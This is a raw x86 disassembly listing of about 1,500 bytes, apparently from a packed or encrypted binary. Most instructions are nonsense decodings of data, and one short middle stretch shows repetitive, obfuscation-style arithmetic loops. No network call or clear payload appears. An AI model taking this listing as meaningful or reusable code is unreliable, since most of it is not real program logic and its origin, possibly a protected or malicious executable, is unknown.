  41897b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41897c:	call   0x9555:0x9fbf495f
  418983:	inc    ebx
  418984:	dec    DWORD PTR [ecx]
  418986:	inc    ebp
  418987:	bound  esi,QWORD PTR [eax+0x5a0d2506]
  41898d:	fadd   QWORD PTR [esi-0x2]
  418990:	loope  0x4189f3
  418992:	mov    ecx,0xf1e7f5fb
  418997:	ja     0x4189cb
  418999:	jno    0x418952
  41899b:	push   eax
  41899c:	test   DWORD PTR [edx],0xf2ec4f1d
  4189a2:	cmp    edi,ecx
  4189a4:	cmp    al,cl
  4189a6:	call   0x51c02ef3
  4189ab:	cmc    
  4189ac:	mov    eax,DWORD PTR [eax+0x27b220a2]
  4189b2:	ret    0xe894
  4189b5:	std    
  4189b6:	shr    DWORD PTR [eax-0x2ca0994e],0x6e
  4189bd:	mov    dh,0xea
  4189bf:	or     DWORD PTR [ebx+0x60],esp
  4189c2:	test   BYTE PTR [edi+ebx*8+0x1f],cl
  4189c6:	mov    al,ds:0x2df84c16
  4189cb:	jbe    0x4189d9
  4189cd:	call   0x24a2:0x4e520084
  4189d4:	and    edx,esi
  4189d6:	adc    dh,BYTE PTR [edi]
  4189d8:	pop    eax
  4189d9:	cli    
  4189da:	cli    
  4189db:	dec    ebx
  4189dc:	inc    ebp
  4189dd:	imul   esi,DWORD PTR [ebx-0x13e396fa],0x2f
  4189e4:	jmp    0x4c851c4b
  4189e9:	or     cl,BYTE PTR [edx]
  4189eb:	(bad)  
  4189ec:	sbb    al,0xe
  4189ee:	sub    al,0x5d
  4189f0:	ret    
  4189f1:	sbb    al,0x48
  4189f3:	scas   al,BYTE PTR es:[edi]
  4189f4:	sub    BYTE PTR [ebx],ah
  4189f6:	std    
  4189f7:	push   ebx
  4189f8:	mov    ds:0xbd655e3e,al
  4189fd:	adc    DWORD PTR [ecx],esp
  4189ff:	loopne 0x418a03
  418a01:	test   DWORD PTR [esi+0x73],ebx
  418a04:	push   0x32
  418a06:	ss adc al,ch
  418a09:	jmp    0x1145:0x7a203e9a
  418a10:	push   esi
  418a11:	cmp    ecx,ecx
  418a13:	mov    edx,0xcd7057c4
  418a18:	cwde   
  418a19:	loopne 0x418a36
  418a1b:	and    eax,0x79a9c1cd
  418a20:	addr16 gs pop esi
  418a23:	outs   dx,BYTE PTR ds:[esi]
  418a24:	cli    
  418a25:	fisttp DWORD PTR [eax+0x36]
  418a28:	repnz dec esp
  418a2a:	arpl   bp,cx
  418a2c:	pop    esi
  418a2d:	xchg   edi,eax
  418a2e:	mov    dh,0x99
  418a30:	ins    BYTE PTR es:[edi],dx
  418a31:	mov    dl,0xe
  418a33:	pop    esp
  418a34:	dec    esi
  418a35:	dec    ebx
  418a36:	cmp    al,0x9d
  418a38:	fld    DWORD PTR [esi]
  418a3a:	loope  0x418a5b
  418a3c:	(bad)  
  418a3d:	jp     0x418a8b
  418a3f:	push   edi
  418a40:	mov    bh,0x66
  418a42:	outs   dx,BYTE PTR ds:[esi]
  418a43:	retf   
  418a44:	pop    ss
  418a45:	add    DWORD PTR [edi-0x50056d51],ebx
  418a4b:	mov    dh,BYTE PTR [esi+edx*4+0x3aeb4c2e]
  418a52:	ss in  eax,dx
  418a54:	gs pop ebx
  418a56:	mov    esp,0x45c8dd4c
  418a5b:	jmp    0xa6b7:0x6bcea76e
  418a62:	pop    ss
  418a63:	adc    dh,BYTE PTR [esp+eax*8+0x2bfd4cb]
  418a6a:	retf   0x5ad6
  418a6d:	gs push edi
  418a6f:	in     eax,dx
  418a70:	dec    ebp
  418a71:	adc    bl,ah
  418a73:	out    0xe2,al
  418a75:	mov    ah,dl
  418a77:	jmp    0x418a05
  418a79:	je     0x418a19
  418a7b:	out    0x7d,eax
  418a7d:	ret    
  418a7e:	mov    esp,0x2612fda0
  418a83:	mov    DWORD PTR [eax-0x55007b36],ebp
  418a89:	daa    
  418a8a:	xlat   BYTE PTR ds:[ebx]
  418a8b:	test   eax,0x52d08281
  418a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a91:	jecxz  0x418a5f
  418a93:	mov    ebx,0x3f355589
  418a98:	daa    
  418a99:	ds cs jg 0x418ab0
  418a9d:	sub    dh,BYTE PTR [eax-0x99320a7]
  418aa3:	inc    edi
  418aa4:	inc    esi
  418aa5:	mov    dl,0xb7
  418aa7:	and    bh,BYTE PTR [esi-0x16ad9417]
  418aad:	sub    DWORD PTR [ebp+0x2766bffd],edx
  418ab3:	lahf   
  418ab4:	pop    es
  418ab5:	ret    
  418ab6:	sub    al,0x19
  418ab8:	and    ch,bl
  418aba:	fldcw  WORD PTR [edx+0x77]
  418abd:	shr    al,cl
  418abf:	jp     0x418af5
  418ac1:	shl    DWORD PTR [ecx-0x27b04aa8],cl
  418ac7:	cmp    DWORD PTR [ebp+0x33],ebx
  418aca:	add    DWORD PTR [eax-0x59bda9cf],edx
  418ad0:	mov    cl,0xbf
  418ad2:	mov    eax,0xb259353b
  418ad7:	push   cs
  418ad8:	inc    edi
  418ad9:	add    DWORD PTR [ecx],0xfffffff2
  418adc:	jns    0x418a62
  418ade:	add    al,0xb3
  418ae0:	(bad)  
  418ae1:	mov    ebp,0x460f5016
  418ae6:	cs pop edi
  418ae8:	fadd   DWORD PTR [esi+0x3363c601]
  418aee:	xchg   ebx,eax
  418aef:	xchg   ecx,eax
  418af0:	rcr    cl,cl
  418af2:	stc    
  418af3:	leave  
  418af4:	scas   al,BYTE PTR es:[edi]
  418af5:	addr16 lahf 
  418af7:	mov    ch,0x61
  418af9:	repz and dh,BYTE PTR [eax]
  418afc:	jb     0x418b41
  418afe:	push   esp
  418aff:	test   BYTE PTR [ebp-0x18],bh
  418b02:	(bad)  
  418b04:	push   0x5471ace1
  418b09:	stc    
  418b0a:	or     DWORD PTR [ebp+0x3a],0xdc0032e3
  418b11:	and    ch,BYTE PTR ds:0xdcfd2e32
  418b17:	mov    ds:0x2cb88539,eax
  418b1c:	mov    ebx,0xad09b1f
  418b21:	inc    ebx
  418b22:	out    0x65,eax
  418b24:	lock cld 
  418b26:	stos   DWORD PTR es:[edi],eax
  418b27:	inc    ebp
  418b28:	(bad)  
  418b29:	mov    esp,0x1fc78485
  418b2e:	and    eax,0xe5d9934e
  418b33:	cld    
  418b34:	mov    ebx,DWORD PTR [ebx]
  418b36:	cmc    
  418b37:	mov    ebp,0xb5aa82dd
  418b3c:	dec    edi
  418b3d:	scas   eax,DWORD PTR es:[edi]
  418b3e:	dec    edi
  418b3f:	fucomip st,st(1)
  418b41:	das    
  418b42:	xor    BYTE PTR [ebp-0x5bc5cac1],0x5b
  418b49:	pop    eax
  418b4a:	mov    ebp,0xa6767bff
  418b4f:	out    0x8f,al
  418b51:	mov    dh,0x8f
  418b53:	jae    0x418b61
  418b55:	inc    edx
  418b56:	jne    0x418b37
  418b58:	xchg   esi,eax
  418b59:	push   ecx
  418b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b5b:	inc    edi
  418b5c:	mov    cl,BYTE PTR [edi-0x6f]
  418b5f:	adc    al,0x85
  418b61:	ret    0x4b66
  418b64:	cdq    
  418b65:	(bad)
  418b68:	mov    al,ds:0x435a6f5e
  418b6d:	out    dx,eax
  418b6e:	mov    ecx,0x58ae734f
  418b73:	xchg   BYTE PTR [ebp+0x2b],ch
  418b76:	inc    ebp
  418b77:	mov    dh,0x2d
  418b79:	mov    ah,0xea
  418b7b:	hlt    
  418b7c:	call   0x896a:0xb91d7c35
  418b83:	out    dx,al
  418b84:	push   ebx
  418b85:	loop   0x418bc6
  418b87:	pop    ebx
  418b88:	test   al,0x38
  418b8a:	dec    ecx
  418b8b:	xor    eax,0x6a6b1673
  418b90:	test   al,0x9b
  418b92:	pop    ebx
  418b93:	out    0x66,al
  418b95:	outs   dx,DWORD PTR ds:[esi]
  418b96:	or     ebp,edi
  418b98:	ds add al,0xe5
  418b9b:	mov    ah,0xa8
  418b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b9e:	inc    edi
  418b9f:	mov    ah,dl
  418ba1:	imul   edi,DWORD PTR [eax],0x78c5e447
  418ba7:	inc    ecx
  418ba8:	xor    al,0xd8
  418baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bab:	sbb    al,0xfb
  418bad:	inc    ebx
  418bae:	and    eax,ebx
  418bb0:	mov    esp,0x8eae6f6e
  418bb5:	or     eax,0x8fbad61c
  418bba:	mov    ebp,0xae0891b1
  418bbf:	cmp    BYTE PTR [ecx+edx*4],al
  418bc2:	jle    0x418bca
  418bc4:	bound  ebp,QWORD PTR [ebx-0x1b3d1626]
  418bca:	loope  0x418c48
  418bcc:	scas   eax,DWORD PTR es:[edi]
  418bcd:	mov    esi,es
  418bcf:	hlt    
  418bd0:	rol    dl,1
  418bd2:	dec    ebx
  418bd3:	jle    0x418bf9
  418bd5:	push   esp
  418bd6:	test   eax,0x8a3916c7
  418bdb:	xor    BYTE PTR [edi+0x45],bh
  418bde:	sub    eax,0xf085f599
  418be3:	mov    edi,0xa9aff261
  418be8:	sub    BYTE PTR [ebx-0x5c],bl
  418beb:	jo     0x418c58
  418bed:	fdiv   DWORD PTR [edi]
  418bef:	mov    ds:0xf90a6e3f,eax
  418bf4:	jmp    0x418bdd
  418bf6:	out    0xf4,al
  418bf8:	call   0x3922:0xc2bbd6fc
  418bff:	sub    eax,0x2768e1ed
  418c04:	xchg   al,al
  418c06:	lock mov al,0x1e
  418c09:	xchg   DWORD PTR [edx+0x3d4148d0],edi
  418c0f:	inc    edi
  418c10:	sub    eax,0x6c21c023
  418c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c16:	iret   
  418c17:	fcmovbe st,st(3)
  418c19:	jl     0x418be2
  418c1b:	gs mov dl,0x6d
  418c1e:	rcl    si,0x11
  418c22:	adc    DWORD PTR [ebx],ecx
  418c24:	push   ds
  418c25:	in     eax,dx
  418c26:	mov    DWORD PTR [ebp+0x3e9f7d05],edx
  418c2c:	in     al,dx
  418c2d:	mov    ah,0xf5
  418c2f:	dec    ebp
  418c30:	pop    ebx
  418c31:	mov    eax,ds:0xa94d19c2
  418c36:	pop    esp
  418c37:	xchg   ebp,eax
  418c38:	retf   
  418c39:	fadd   DWORD PTR [eax-0x6cd71bdc]
  418c3f:	call   0xd2ec:0xde47089b
  418c46:	inc    ecx
  418c47:	add    eax,DWORD PTR [esi-0x74d34337]
  418c4d:	jbe    0x418c14
  418c4f:	and    ebx,edi
  418c51:	jle    0x418cb3
  418c53:	out    0x82,al
  418c55:	aas    
  418c56:	xor    bh,al
  418c58:	retf   0xd66e
  418c5b:	jns    0x418cc2
  418c5d:	and    DWORD PTR [esi-0x2de12e01],ebx
  418c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c64:	pop    esp
  418c65:	mov    ebp,edi
  418c67:	data16 mov bh,0x48
  418c6a:	enter  0xd8fc,0x2e
  418c6e:	adc    esp,DWORD PTR ds:0x741f7d9a
  418c74:	pop    esp
  418c75:	mov    bh,0xbe
  418c77:	fwait
  418c78:	not    DWORD PTR [ebp-0x24]
  418c7b:	sahf   
  418c7c:	jmp    0x418cfd
  418c7e:	jae    0x418c1c
  418c80:	xchg   ebx,eax
  418c81:	mov    DWORD PTR [esp+ebx*8],ebp
  418c84:	sub    DWORD PTR [eax-0x27],edx
  418c87:	sub    al,0xb7
  418c89:	mov    ah,0xbc
  418c8b:	mov    ebp,0xe8e809f4
  418c90:	dec    edi
  418c91:	and    BYTE PTR [edi],ch
  418c93:	scas   eax,DWORD PTR es:[edi]
  418c94:	imul   ecx
  418c96:	arpl   WORD PTR [ecx-0x50],bp
  418c99:	rol    BYTE PTR [edx],cl
  418c9b:	je     0x418cf6
  418c9d:	xchg   cl,ch
  418c9f:	fwait
  418ca0:	or     al,0x63
  418ca2:	sub    DWORD PTR [ebp+0x6c],0xfffffffc
  418ca6:	xor    al,0x8f
  418ca8:	arpl   WORD PTR [esi],bp
  418caa:	pop    ebp
  418cab:	dec    BYTE PTR [ebx]
  418cad:	(bad)  
  418cae:	leave  
  418caf:	mov    bh,0x4c
  418cb1:	mov    eax,ds:0x12fdb043
  418cb6:	test   bl,ch
  418cb8:	lahf   
  418cb9:	inc    esp
  418cba:	ins    BYTE PTR es:[edi],dx
  418cbb:	popa   
  418cbc:	dec    ebx
  418cbd:	cmp    DWORD PTR [ebx],edi
  418cbf:	sub    al,0xe1
  418cc1:	inc    esp
  418cc2:	xor    edi,DWORD PTR [eax-0x73]
  418cc5:	out    dx,al
  418cc6:	pop    edi
  418cc7:	xor    dl,al
  418cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cca:	clc    
  418ccb:	adc    ah,BYTE PTR [ebx-0x394d4e12]
  418cd1:	or     ebx,DWORD PTR [esp+eax*4+0x5c]
  418cd5:	ret    
  418cd6:	inc    ebx
  418cd7:	icebp  
  418cd8:	or     dh,al
  418cda:	and    al,0x22
  418cdc:	pusha  
  418cdd:	mov    cl,0x3d
  418cdf:	into   
  418ce0:	retf   0xb56
  418ce3:	sub    ah,BYTE PTR [edx+0x471d2318]
  418ce9:	jne    0x418cb1
  418ceb:	cmp    dh,BYTE PTR [ebp+0x64cb71d0]
  418cf1:	mov    esp,0x5df24926
  418cf6:	xchg   edx,eax
  418cf7:	(bad)
  418cfa:	enter  0xa9bf,0xa6
  418cfe:	cmp    cl,dl
  418d00:	mov    al,0x49
  418d02:	pop    ecx
  418d03:	sub    esi,DWORD PTR ss:[ebx+0x7f]
  418d07:	or     ebp,DWORD PTR [eax]
  418d09:	push   ebp
  418d0a:	je     0x418cde
  418d0c:	mov    edx,0xd1a4dad9
  418d11:	(bad)  
  418d12:	int3   
  418d13:	ins    BYTE PTR es:[edi],dx
  418d14:	add    al,0x49
  418d16:	mov    al,0xad
  418d18:	or     eax,0x1b0f2113
  418d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d1f:	cdq    
  418d20:	leave  
  418d21:	inc    edx
  418d22:	sbb    dl,BYTE PTR [ebx-0x7c5728d]
  418d28:	sti    
  418d29:	jb     0x418d1d
  418d2b:	push   ebp
  418d2c:	mov    ch,0xab
  418d2e:	clc    
  418d2f:	push   DWORD PTR [ebp-0x566d098b]
  418d35:	inc    ecx
  418d36:	xor    esi,0xfe10661d
  418d3c:	sub    al,0x78
  418d3e:	retf   
  418d3f:	call   0x8a8efc2b
  418d44:	sub    ch,cl
  418d46:	gs mov dh,0x5b
  418d49:	inc    ecx
  418d4a:	hlt    
  418d4b:	retf   
  418d4c:	out    0xd9,eax
  418d4e:	or     DWORD PTR [ecx],esi
  418d50:	lods   al,BYTE PTR ds:[esi]
  418d51:	push   ss
  418d52:	jne    0x418dcf
  418d54:	rcl    dh,cl
  418d56:	mov    ebx,0x6b75b6ad
  418d5b:	bound  edi,QWORD PTR [ebx+0x202d0813]
  418d61:	sbb    al,BYTE PTR [edx+esi*8+0x4]
  418d65:	jno    0x418d83
  418d67:	test   eax,0xe5b977b2
  418d6c:	call   0xec04ea40
  418d71:	xchg   ecx,eax
  418d72:	sbb    BYTE PTR [ecx-0x7f],ah
  418d75:	sbb    dl,BYTE PTR [edi*8+0xa1cd3ea]
  418d7c:	fstp   st(6)
  418d7e:	retf   
  418d7f:	stos   DWORD PTR es:[edi],eax
  418d80:	sbb    ebx,DWORD PTR [eax+0x409e1753]
  418d86:	mov    dl,BYTE PTR [ebp-0x20]
  418d89:	xlat   BYTE PTR ds:[ebx]
  418d8a:	int    0x55
  418d8c:	mov    ecx,DWORD PTR [edi-0x2dbd0e57]
  418d92:	(bad)  
  418d94:	add    al,0xad
  418d96:	fst    DWORD PTR [ecx-0x2d64fe5e]
  418d9c:	jecxz  0x418df5
  418d9e:	push   eax
  418d9f:	add    DWORD PTR [eax],0x6836a200
  418da5:	add    ah,0xc9
  418da8:	and    eax,0xf6fe2c78
  418dad:	pop    edi
  418dae:	mov    esp,0xf4287037
  418db3:	inc    esp
  418db4:	nop
  418db5:	add    dh,bh
  418db7:	add    dl,BYTE PTR [esi+0x1768f264]
  418dbd:	rcr    BYTE PTR [ebx+0x1904c06e],cl
  418dc3:	das    
  418dc4:	not    ebp
  418dc6:	dec    ebp
  418dc7:	jb     0x418dc5
  418dc9:	aam    0xac
  418dcb:	dec    edx
  418dcc:	sar    DWORD PTR [ecx-0x7bdf8693],cl
  418dd2:	imul   eax,edi,0x17
  418dd5:	jo     0x418d6e
  418dd7:	mov    ds:0xf5ac959d,al
  418ddc:	mov    esp,ds
  418dde:	adc    DWORD PTR [edi-0x27],esi
  418de1:	pusha  
  418de2:	add    al,BYTE PTR [ecx+eax*2+0xd119cf6]
  418de9:	(bad)  
  418dea:	repz les eax,FWORD PTR [edi]
  418ded:	inc    esi
  418dee:	xchg   edx,eax
  418def:	test   al,0xdc
  418df1:	adc    BYTE PTR [esi],ch
  418df3:	and    eax,0xa40e3dbe
  418df8:	cs jbe 0x418e49
  418dfb:	pop    esp
  418dfc:	lds    edi,FWORD PTR [ebx+edx*8]
  418dff:	pop    ebx
  418e00:	mov    es:0x2a26f35c,al
  418e06:	inc    eax
  418e07:	dec    esi
  418e08:	mov    esp,0x53892fa9
  418e0d:	dec    edx
  418e0e:	das    
  418e0f:	sbb    al,0x52
  418e11:	mov    al,0xa8
  418e13:	stc    
  418e14:	imul   eax,DWORD PTR [ebx+edx*1+0x45],0x7a992888
  418e1c:	xor    DWORD PTR [edx+0x3e3dc276],edx
  418e22:	xchg   ecx,eax
  418e23:	aad    0x55
  418e25:	test   ebx,edi
  418e27:	sbb    al,0x23
  418e29:	addr16 adc al,0xf2
  418e2c:	xor    al,0x16
  418e2e:	inc    ecx
  418e2f:	jmp    0x878d:0x15c03406
  418e36:	rol    ch,0xc9
  418e39:	out    0x50,eax
  418e3b:	mov    dh,0xc5
  418e3d:	pop    ebp
  418e3e:	push   0xcf122f6a
  418e43:	lods   eax,DWORD PTR ds:[esi]
  418e44:	in     eax,dx
  418e45:	or     al,0x93
  418e47:	cmc    
  418e48:	scas   eax,DWORD PTR es:[edi]
  418e49:	das    
  418e4a:	mov    edi,0x5ce47a37
  418e4f:	or     DWORD PTR [eax+0x76f5d897],edi
  418e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e56:	add    DWORD PTR [ecx],ecx
  418e58:	push   ss
  418e59:	stos   DWORD PTR es:[edi],eax
  418e5a:	test   ecx,0xaa6000aa
  418e60:	ins    BYTE PTR es:[edi],dx
  418e61:	sub    BYTE PTR [edi-0x4d528e34],dl
  418e67:	mov    al,ds:0x46441e99
  418e6c:	and    bl,BYTE PTR [ecx]
  418e6e:	int    0xc1
  418e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e71:	sbb    DWORD PTR [esi+eax*4],ebp
  418e74:	sbb    DWORD PTR [edi+edi*2+0x12b774df],esp
  418e7b:	xor    eax,DWORD PTR [edi]
  418e7d:	jns    0x418eef
  418e7f:	(bad)  
  418e80:	out    dx,al
  418e81:	inc    ebx
  418e82:	push   es
  418e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e84:	retf   
  418e85:	mov    WORD PTR [ebx+esi*1+0x35],?
  418e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e8a:	cwde   
  418e8b:	ret    
  418e8c:	xor    DWORD PTR [ebx+0x32113e65],0x6a7f3863
  418e96:	xchg   ecx,eax
  418e97:	xchg   ecx,eax
  418e98:	jle    0x418e8e
  418e9a:	aad    0xaf
  418e9c:	and    bl,BYTE PTR [edi-0x45]
  418e9f:	out    0xa2,eax
  418ea1:	jae    0x418ebf
  418ea3:	xor    ebp,DWORD PTR [ebp-0x5bc907f1]
  418ea9:	repz add ebx,DWORD PTR ds:0x9b1c6c8e
  418eb0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  418eb2:	mov    ds:0xb0fc6799,al
  418eb7:	jp     0x418ec4
  418eb9:	add    al,cl
  418ebb:	cli    
  418ebc:	loopne 0x418f2b
  418ebe:	sar    BYTE PTR [ebp-0x5c049153],1
  418ec4:	or     esp,esp
  418ec6:	mov    esp,0xf4569020
  418ecb:	mov    cl,0xb1
  418ecd:	mov    ecx,0x2ef0a74c
  418ed2:	fstp   QWORD PTR [ebp+0x2cc84aba]
  418ed8:	inc    esp
  418ed9:	push   esp
  418eda:	and    ecx,DWORD PTR [ecx+0x3]
  418edd:	fmul   st,st(0)
  418edf:	xor    dl,dh
  418ee1:	mov    bh,BYTE PTR [ecx]
  418ee3:	sbb    DWORD PTR [edi-0x4],ebx
  418ee6:	div    DWORD PTR [esi-0x497f6dfb]
  418eec:	add    BYTE PTR [edx-0x440e134f],dl
  418ef2:	jns    0x418f21
  418ef4:	add    eax,0xe624e2e8
  418ef9:	lds    eax,FWORD PTR [ecx+0x59cd9e4d]
  418eff:	scas   al,BYTE PTR es:[edi]
  418f00:	shl    BYTE PTR ss:[eax+0x13fe94ec],cl
  418f07:	xor    al,0x6c
  418f09:	stc    
  418f0a:	sbb    dh,dl
  418f0c:	add    BYTE PTR [ebx-0x4144c777],ch
  418f12:	cmp    BYTE PTR [ebx-0x23],cl
  418f15:	mov    eax,DWORD PTR [eax+edi*2+0x6f64e260]
  418f1c:	xor    al,0x67
  418f1e:	sbb    BYTE PTR [esi],bl
  418f20:	leave  
  418f21:	push   ss
  418f22:	iret   
  418f23:	pop    edx
  418f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f25:	in     al,0x52
  418f27:	or     dh,ah
  418f29:	shl    BYTE PTR [ecx+edi*4+0x5e8aac46],cl
  418f30:	je     0x418ed3
  418f32:	or     cl,dh
  418f34:	fcomp  st(6)
  418f36:	dec    ecx
  418f37:	jl     0x418f6e
  418f39:	push   ds
  418f3a:	mov    BYTE PTR [ebx+0x4667ed9],bl
  418f40:	xor    esp,0x4b
  418f43:	sbb    ebp,esi
  418f45:	jmp    0x418ed9
  418f47:	jl     0x418fae
  418f49:	out    dx,eax
  418f4a:	pop    ebx
  418f4b:	stos   DWORD PTR es:[edi],eax
  418f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f4d:	push   esi
  418f4e:	and    eax,DWORD PTR [edi+0x15]
  418f51:	sub    BYTE PTR [edi-0x16e6d1ff],bh
  418f57:	push   es
  418f58:	cmp    BYTE PTR [esi+0x6364ea72],bh
  418f5e:	fs pop es
  418f60:	test   BYTE PTR [ebp+0x73221dbf],0xf0
  418f67:	stos   BYTE PTR es:[edi],al
  418f68:	aam    0x82
  418f6a:	add    edx,DWORD PTR [ebx]
  418f6c:	cmp    al,0x6
  418f6e:	je     0x418fcd
  418f70:	add    BYTE PTR [edx+0x77],bl
  418f73:	dec    esi
  418f74:	mov    WORD PTR [edx-0x54],gs
  418f77:	inc    esi
  418f78:	inc    edi
  418f79:	add    al,0x8
  418f7b:	adc    BYTE PTR [eax+0x65],0xf
  418f7f:	mov    ecx,0xd6e21c65
  418f84:	mov    dh,0xce
  418f86:	cwde   
  418f87:	mov    ch,0x98
  418f89:	cmc    
  418f8a:	sbb    al,0x96
  418f8c:	stos   BYTE PTR es:[edi],al
  418f8d:	fld    QWORD PTR [edx-0x1f]
  418f90:	mov    fs,WORD PTR [eax]
  418f92:	loopne 0x418f3d
  418f94:	push   eax
  418f95:	cli    
  418f96:	test   DWORD PTR [esi+0x48],ebp
  418f99:	jp     0x418f69
  418f9b:	cmp    al,0x4e
  418f9d:	lods   eax,DWORD PTR ds:[esi]
  418f9e:	cmp    esi,eax
  418fa0:	rol    DWORD PTR [esi],cl
  418fa2:	adc    eax,eax
  418fa4:	int3   
  418fa5:	stc    
  418fa6:	pop    esp
  418fa7:	mov    ebx,0xc33fa8fd
  418fac:	jns    0x418f59
  418fae:	repnz xor esi,DWORD PTR [ebx-0x509fc34]
  418fb5:	into   
  418fb6:	sub    ah,BYTE PTR [eax]
  418fb8:	cmp    DWORD PTR [ebx],esi
  418fba:	fsubr  DWORD PTR [ebx]
  418fbc:	shr    DWORD PTR [ebx],cl
  418fbe:	(bad)  
  418fbf:	xor    edx,eax
  418fc1:	mov    DWORD PTR [ebp+0x8],edx
  418fc4:	mov    edx,DWORD PTR [ebp+0x8]
  418fc7:	mov    ebx,DWORD PTR [ebp-0x58]
  418fca:	add    edx,0x5708fa
  418fd0:	imul   edx,ebx
  418fd3:	mov    DWORD PTR [ebp-0x58],edx
  418fd6:	mov    edx,DWORD PTR [ebp+0x8]
  418fd9:	mov    ebx,DWORD PTR [ebp-0x54]
  418fdc:	add    edx,0x64f898
  418fe2:	or     edx,ebx
  418fe4:	mov    DWORD PTR [ebp-0x54],edx
  418fe7:	mov    edx,DWORD PTR [ebp+0x8]
  418fea:	mov    ebx,DWORD PTR [ebp-0x50]
  418fed:	add    edx,ecx
  418fef:	xor    edx,ebx
  418ff1:	mov    DWORD PTR [ebp-0x50],edx
  418ff4:	mov    edx,DWORD PTR [ebp+0x8]
  418ff7:	mov    ebx,DWORD PTR [ebp-0x4c]
  418ffa:	add    edx,edi
  418ffc:	and    edx,ebx
  418ffe:	mov    DWORD PTR [ebp-0x4c],edx
  419001:	mov    edx,DWORD PTR [ebp+0x8]
  419004:	mov    ebx,DWORD PTR [ebp-0x48]
  419007:	lea    edx,[ebx+edx*1+0x241fcdf]
  41900e:	mov    DWORD PTR [ebp-0x48],edx
  419011:	mov    edx,DWORD PTR [ebp+0x8]
  419014:	mov    ebx,0xfa5e1524
  419019:	sub    ebx,edx
  41901b:	add    ebx,DWORD PTR [ebp-0x44]
  41901e:	mov    DWORD PTR [ebp-0x44],ebx
  419021:	mov    edx,DWORD PTR [ebp+0x8]
  419024:	xor    edx,eax
  419026:	add    edx,esi
  419028:	jne    0x416c52
  41902e:	jmp    0x4190bb
  419033:	mov    edx,DWORD PTR [ebp-0x14]
  419036:	mov    DWORD PTR [ebp+0x8],edx
  419039:	jmp    0x4190ae
  41903e:	mov    edx,DWORD PTR [ebp+0x8]
  419041:	mov    ebx,DWORD PTR [ebp-0x8]
  419044:	xor    edx,eax
  419046:	xor    ebx,eax
  419048:	sub    edx,ebx
  41904a:	sub    edx,esi
  41904c:	xor    edx,eax
  41904e:	mov    DWORD PTR [ebp+0x8],edx
  419051:	mov    edx,DWORD PTR [ebp+0x8]
  419054:	mov    ebx,DWORD PTR [ebp-0x58]
  419057:	add    edx,0x5708fa
  41905d:	imul   edx,ebx
  419060:	mov    DWORD PTR [ebp-0x58],edx
  419063:	mov    edx,DWORD PTR [ebp+0x8]
  419066:	mov    ebx,DWORD PTR [ebp-0x54]
  419069:	add    edx,0x64f898
  41906f:	or     edx,ebx
  419071:	mov    DWORD PTR [ebp-0x54],edx
  419074:	mov    edx,DWORD PTR [ebp+0x8]
  419077:	mov    ebx,DWORD PTR [ebp-0x50]
  41907a:	add    edx,ecx
  41907c:	xor    edx,ebx
  41907e:	mov    DWORD PTR [ebp-0x50],edx
  419081:	mov    edx,DWORD PTR [ebp+0x8]
  419084:	mov    ebx,DWORD PTR [ebp-0x4c]
  419087:	add    edx,edi
  419089:	and    edx,ebx
  41908b:	mov    DWORD PTR [ebp-0x4c],edx
  41908e:	mov    edx,DWORD PTR [ebp+0x8]
  419091:	mov    ebx,DWORD PTR [ebp-0x48]
  419094:	lea    edx,[ebx+edx*1+0x241fcdf]
  41909b:	mov    DWORD PTR [ebp-0x48],edx
  41909e:	mov    edx,DWORD PTR [ebp+0x8]
  4190a1:	mov    ebx,0xfa5e1524
  4190a6:	sub    ebx,edx
  4190a8:	add    ebx,DWORD PTR [ebp-0x44]
  4190ab:	mov    DWORD PTR [ebp-0x44],ebx
  4190ae:	mov    edx,DWORD PTR [ebp+0x8]
  4190b1:	xor    edx,eax
  4190b3:	add    edx,esi
  4190b5:	jne    0x41903e
  4190bb:	mov    edx,DWORD PTR [ebp-0x14]
  4190be:	mov    DWORD PTR [ebp+0x8],edx
  4190c1:	jmp    0x41b495
  4190c6:	mov    edx,DWORD PTR [ebp+0x8]
  4190c9:	mov    ebx,DWORD PTR [ebp-0x8]
  4190cc:	xor    edx,eax
  4190ce:	xor    ebx,eax
  4190d0:	sub    edx,ebx
  4190d2:	sub    edx,esi
  4190d4:	xor    edx,eax
  4190d6:	mov    DWORD PTR [ebp+0x8],edx
  4190d9:	jmp    0x41b438
  4190de:	adc    esp,DWORD PTR [eax-0x55]
  4190e1:	jl     0x419063
  4190e3:	mov    eax,0x95ec0084
  4190e8:	bound  ebp,QWORD PTR [ecx+0x70]
  4190eb:	cmp    eax,0x1d33fb93
  4190f0:	jl     0x419075
  4190f2:	cmp    eax,0xd383835e
  4190f7:	push   0xe9faa3b0
  4190fc:	(bad)  
  4190fd:	mov    ebp,0x43cb44c2
  419102:	and    ebx,DWORD PTR [edx-0x23]
  419105:	out    dx,eax
  419106:	retf   0x138
  419109:	(bad)  
  41910a:	and    DWORD PTR [ecx-0x62236847],esi
  419110:	aam    0xa3
  419112:	mov    ds,esp
  419114:	jmp    0xe7a877d2
  419119:	mov    WORD PTR [ecx+0x3a],ds
  41911c:	add    edi,eax
  41911e:	out    0x1d,al
  419120:	aam    0x7
  419122:	mov    ds:0x16c52bf8,al
  419127:	sbb    eax,0x54ffb0fc
  41912c:	xor    BYTE PTR [ebp+0xd],bh
  41912f:	fcmovbe st,st(0)
  419131:	call   0x1b245f1f
  419136:	jmp    0x8e0baddf
  41913b:	hlt    
  41913c:	add    al,0x40
  41913e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41913f:	jmp    0x4190db
  419141:	icebp  
